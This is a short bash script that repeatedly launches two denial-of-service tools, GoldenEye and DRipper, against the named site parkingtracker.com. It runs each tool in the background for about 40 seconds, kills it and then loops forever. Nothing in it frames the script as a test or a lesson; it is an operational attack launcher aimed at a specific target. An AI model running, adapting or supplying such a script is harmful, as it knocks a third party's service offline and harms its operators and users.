#!/bin/bash

# Define the commands in an array
commands=(
  "python3 ./dos_ge/goldeneye.py http://parkingtracker.com"
  "python3 ./dos_ripper_/DRipper.py -s parkingtracker.com"
)

while true; do
  # Loop through each command
  for cmd in "${commands[@]}"; do
    echo "Starting command: $cmd"

    # Start the command in the background
    $cmd &
    # Get the PID of the command just run
    cmd_pid=$!
    # Wait for 180 seconds before attempting to kill the command
    sleep 40
    # Attempt to kill the process
    pkill -f "$cmd"

    # wait $PID
    sleep 5


  done
done
echo "All commands have been executed."
